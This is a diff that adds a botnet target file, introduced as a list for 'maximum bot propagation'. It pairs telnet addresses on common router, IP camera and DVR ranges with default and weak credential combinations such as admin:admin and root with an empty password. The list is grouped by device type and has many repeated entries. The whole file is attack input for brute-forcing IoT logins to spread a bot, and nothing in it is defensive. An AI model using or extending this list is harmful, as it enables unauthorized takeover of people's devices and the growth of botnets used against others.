@@ -1,0 +1,95 @@
+# Enhanced target list for maximum bot propagation
+# IoT devices, routers, cameras, and vulnerable systems
+
+# Common IoT device ranges
+192.168.1.1:23 admin:admin
+192.168.0.1:23 admin:admin
+192.168.1.1:23 root:root
+192.168.0.1:23 root:root
+192.168.1.1:23 admin:
+192.168.0.1:23 root:
+192.168.1.1:23 admin:password
+192.168.0.1:23 root:password
+
+# Router default credentials
+10.0.0.1:23 admin:admin
+10.0.0.1:23 root:root
+10.0.0.1:23 admin:
+10.0.0.1:23 root:
+172.16.0.1:23 admin:admin
+172.16.0.1:23 root:root
+
+# IP Camera ranges
+192.168.1.100:23 admin:admin
+192.168.1.101:23 admin:admin
+192.168.1.102:23 admin:admin
+192.168.1.103:23 admin:admin
+192.168.1.104:23 admin:admin
+192.168.1.105:23 admin:admin
+192.168.1.106:23 admin:admin
+192.168.1.107:23 admin:admin
+192.168.1.108:23 admin:admin
+192.168.1.109:23 admin:admin
+
+# DVR/NVR systems
+192.168.1.200:23 admin:admin
+192.168.1.201:23 admin:admin
+192.168.1.202:23 admin:admin
+192.168.1.203:23 admin:admin
+192.168.1.204:23 admin:admin
+
+# Common vulnerable devices
+192.168.1.1:23 admin:12345
+192.168.1.1:23 admin:123456
+192.168.1.1:23 admin:123456789
+192.168.1.1:23 admin:password
+192.168.1.1:23 admin:admin123
+192.168.1.1:23 admin:root
+192.168.1.1:23 root:admin
+192.168.1.1:23 root:12345
+192.168.1.1:23 root:123456
+192.168.1.1:23 root:password
+
+# Guest accounts
+192.168.1.1:23 guest:guest
+192.168.1.1:23 guest:
+192.168.1.1:23 user:user
+192.168.1.1:23 user:
+192.168.1.1:23 test:test
+192.168.1.1:23 test:
+
+# Empty passwords
+192.168.1.1:23 admin:
+192.168.1.1:23 root:
+192.168.1.1:23 user:
+192.168.1.1:23 guest:
+192.168.1.1:23 test:
+192.168.1.1:23 admin:
+192.168.1.1:23 root:
+
+# Common weak passwords
+192.168.1.1:23 admin:1234
+192.168.1.1:23 admin:12345
+192.168.1.1:23 admin:123456
+192.168.1.1:23 admin:123456789
+192.168.1.1:23 admin:password
+192.168.1.1:23 admin:admin
+192.168.1.1:23 admin:root
+192.168.1.1:23 root:admin
+192.168.1.1:23 root:1234
+192.168.1.1:23 root:12345
+192.168.1.1:23 root:123456
+192.168.1.1:23 root:password
+192.168.1.1:23 root:root
+
+# Manufacturer defaults
+192.168.1.1:23 admin:admin
+192.168.1.1:23 root:root
+192.168.1.1:23 admin:
+192.168.1.1:23 root:
+192.168.1.1:23 admin:admin
+192.168.1.1:23 root:root
+192.168.1.1:23 admin:12345
+192.168.1.1:23 root:12345
+192.168.1.1:23 admin:password
+192.168.1.1:23 root:password
